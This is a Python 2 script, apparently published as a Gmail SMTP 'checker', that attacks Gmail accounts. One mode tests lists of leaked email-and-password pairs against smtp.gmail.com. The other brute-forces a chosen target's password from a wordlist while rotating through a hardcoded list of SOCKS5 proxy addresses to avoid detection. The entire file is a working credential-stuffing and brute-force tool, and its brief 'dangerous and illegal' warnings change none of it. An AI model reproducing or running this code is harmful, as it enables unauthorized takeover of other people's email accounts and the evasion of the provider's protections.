import os
import sys
import smtplib
import optparse
import time
import tqdm
import socks
import random


proxys = (['189.60.234.136:65000', '186.223.123.245:26671', '191.180.241.53:59268', '189.122.234.250:65000', '201.53.5.207:26111', "186.223.123.245:26671", "189.122.234.250:65000", "177.143.254.187:58929", "191.191.85.60:17286", "191.180.241.53:59268", "189.60.234.136:65000", "189.122.234.86:65000", "201.53.5.207:26111", "191.179.202.131:56373", "179.156.77.16:65000", "179.215.29.166:11908", "179.153.229.203:65000", "177.81.251.217:58253", "177.64.52.27:34139", "177.141.255.66:59338", "177.64.244.231:17831", "189.120.229.221:61856", "179.218.229.212:65000", "177.140.137.198:37199", "177.34.249.191:18589", "186.220.236.161:65000", "186.220.243.177:57448", "189.60.233.211:65000", "189.122.235.66:65000", "189.60.234.164:65000", "189.60.234.84:65000", "179.218.229.50:65000", "189.122.234.89:65000"])


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    warning = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def main() :
	if __name__ == '__main__':
		parser = optparse.OptionParser("usage: python smtpchecker.py --mode checker/bruter ")
		parser.add_option("-t", "--host", dest="hostname", default="smtp.gmail.com", type="string", help="specify hostname to run on")
		parser.add_option("-p", "--port", dest="port", default="587", type="int", help="specify port to run on")
		parser.add_option("-f", "--file", dest="filename", type="string", help="Enter the comma-separated file with email and password")
		parser.add_option("-m", "--mode", dest="mode", type="string", help="Choose a mode between bruter or checker")
		parser.add_option("-e", "--email", dest="email", type="string", help="Selects the target for the attack with the passwords of its dictionary")
		parser.add_option("-w", "--wordlist", dest="wordlist", type="string", help="Select your word list")
		(options, args) = parser.parse_args()

	host = options.hostname
	port = options.port
	file = options.filename
	mode = options.mode
	email = options.email
	wordlist = options.wordlist

	

	print("""      
						
       .-. \_/ .-. 		
       \.-\/=\/.-/ 	           
    '-./___|=|___\.-'    GMAIL SMTP CHECKER v1.0
   .--| \|/`"`\|/ |--.	 Do forget not be evil. 
  (((_)\  .---.  /(_)))   
   `\ \_`-.   .-'_/ /`_   
     '.__       __.'(_))
         /  FB  \     //
        |       |__.'/
        \       /--'`
    .--,-' .--. '----.
   '----`--'  '--`----'
     By @fbctf 
     https://twitter.com/fbctf
	""")



	print bcolors.warning + "Warning: This can be dangerous and illegal!" + bcolors.ENDC


	def checker():

		files = open(file, "r")
		lines = files.readlines()

		r = []

		for count, line in enumerate(tqdm.tqdm(lines)):

			k = map(str.strip, lines)
			v = k[count].find(",")
			e = k[count][0:v]
			p = k[count][v+1:] 
		 	
			try:

		            server = smtplib.SMTP(host, port)
		            server.ehlo()
		            server.starttls()
		            authorized = server.login(e, p) 

		            if authorized:
		            	print "[+] Password found less secure applications enabled."
		            else :
		            	print "[+] Password not found "

		        except smtplib.SMTPResponseException, SMTPResponse:
		            if len(SMTPResponse[1]) > 510 and len(SMTPResponse[1]) \
		                < 516 and SMTPResponse[0] == 534:
		                r.append((e,p))
		if len(r) > 0:
			print bcolors.OKGREEN + "[+] Checking the results %s/%s passwords found."  % (len(lines), len(r) ) + bcolors.ENDC 
		else :
			print bcolors.FAIL + "[+] Checking the results %s Passwords found!!!"  % (len(r) ) + bcolors.ENDC 
		
		for results in r :
		  print results[0] + "," + results[1]
    
	def bruter() :

		files = open(wordlist, "r")
		lines = files.readlines()
	
		r = []

		print bcolors.OKGREEN + "[+] Loading %s proxys ..." % (len(proxys)) + bcolors.ENDC
		print bcolors.OKGREEN + "[+] Loading %s passwords ..." % (len(lines)) + bcolors.ENDC

		for count, line in enumerate(tqdm.tqdm(lines)) :

			k = map(str.strip, lines)
			e = k[count]

			Map = random.choice(proxys)
			separator = Map.find(":")
			ipaddress = Map[:separator]
			portadress = Map[separator+1:]

			host_proxy = str(ipaddress)
			port_proxy = int(portadress)

			print ("Try with Proxy address %s:%s" % (host_proxy, port_proxy))

			time.sleep(0.1)
			
			try:

				#socks.setdefaultproxy(TYPE, ADDR, PORT)
				socks.setdefaultproxy(socks.SOCKS5, host_proxy,port_proxy)
				socks.wrapmodule(smtplib)

				server = smtplib.SMTP(host, port)
				server.ehlo()
				# server.set_debuglevel(1)  // Debug 1
				server.starttls()
				authorized = server.login(email, e) 

				if authorized:
					print "[+] Password found less secure applications enabled."
				else :
					print "[+] Password not found "

		        except smtplib.SMTPResponseException, SMTPResponse:
		            if len(SMTPResponse[1]) > 510 and len(SMTPResponse[1]) \
		                < 516 and SMTPResponse[0] == 534:
		                r.append((email,e))
		if len(r) > 0:
			print bcolors.OKGREEN + "[+] Checking the results %s/%s passwords found."  % (len(lines), len(r) ) + bcolors.ENDC 
		else :
			print bcolors.FAIL + "[+] Checking the results %s Passwords found!!!"  % (len(r) ) + bcolors.ENDC 
		
		for results in r :
		  print results[0] + "," + results[1]


	while True:
		nextStep = raw_input("Do you wish to continue? (Y/n): ")
		
		if nextStep == "y" or nextStep == "Y" :

			if mode == "checker" or mode == "CHECKER":
					path = raw_input("Enter the comma-separated file with email and password: ")
					file = path
					print bcolors.warning + "[+] Is at its own risk..." + bcolors.ENDC
					checker()
			elif mode == "bruter" or mode == "BRUTER" :
					addressMail = raw_input("Enter your target email: ")
					email = addressMail
					path = raw_input("Enter with the wordlist: ")
					wordlist = path
					print bcolors.warning + "[+] Is at its own risk..." + bcolors.ENDC
					bruter()
		 	break
		elif nextStep == "n" or nextStep == "N" :
			sys.exit("Don't be evil")
			break
		else :
			sys.exit("Argument is not valid.")
main()
